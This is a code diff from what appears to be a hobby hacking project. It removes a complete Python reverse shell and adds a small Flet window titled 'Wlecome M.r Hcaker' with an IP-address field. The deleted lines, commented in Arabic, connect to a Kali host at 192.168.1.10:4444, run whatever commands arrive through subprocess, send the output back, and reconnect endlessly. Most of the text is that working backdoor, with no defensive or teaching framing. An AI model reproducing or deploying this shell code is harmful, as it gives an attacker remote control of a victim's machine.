@@ -1,37 +1,15 @@
-import socket
-import subprocess
+import flet as ft
+def main(page:ft.Page):
+    page.window.width=800
+    page.window.height=700
+    page.window.left=300
+    page.window.top=10
+    page.theme_mode=ft.ThemeMode.SYSTEM
+    page.add(
+        ft.Row([ft.Text("Wlecome M.r Hcaker",size="50",color=ft.colors.BLACK87)],ft.MainAxisAlignment.CENTER),
+        ft.Row([ft.TextField(label="Enter ip address",icon=ft.icons.ADD_REACTION_SHARP,width=400,color=ft.colors.WHITE,text_size='20',bgcolor=ft.colors.BLUE_ACCENT_700,border_radius=20)],ft.MainAxisAlignment.CENTER),
+    )
+    page.update()
 
-def reverse_shell():
-    # استبدل IP بالـ IP الخاص بجهازك
-    HOST = '192.168.1.10'  # عنوان IP لجهاز Kali
-    PORT = 4444  # المنفذ المفتوح في جهاز Kali
-
-    while True:
-        try:
-            # إنشاء اتصال socket
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((HOST, PORT))
-
-            # إرسال تنبيه عند الاتصال
-            s.send(b"Connection Established!\n")
-
-            while True:
-                # استقبال الأوامر
-                cmd = s.recv(1024).decode("utf-8")
-                if cmd.lower() == "exit":
-                    break
-
-                # تنفيذ الأمر
-                output = subprocess.getoutput(cmd)
-
-                # إرسال النتيجة
-                if output:
-                    s.send(output.encode("utf-8"))
-                else:
-                    s.send(b"No output\n")
-        except Exception as e:
-            # في حالة حدوث خطأ، حاول إعادة الاتصال
-            s.close()
-
-# تشغيل الـ reverse shell
-reverse_shell()
+ft.app(target=main)
+    
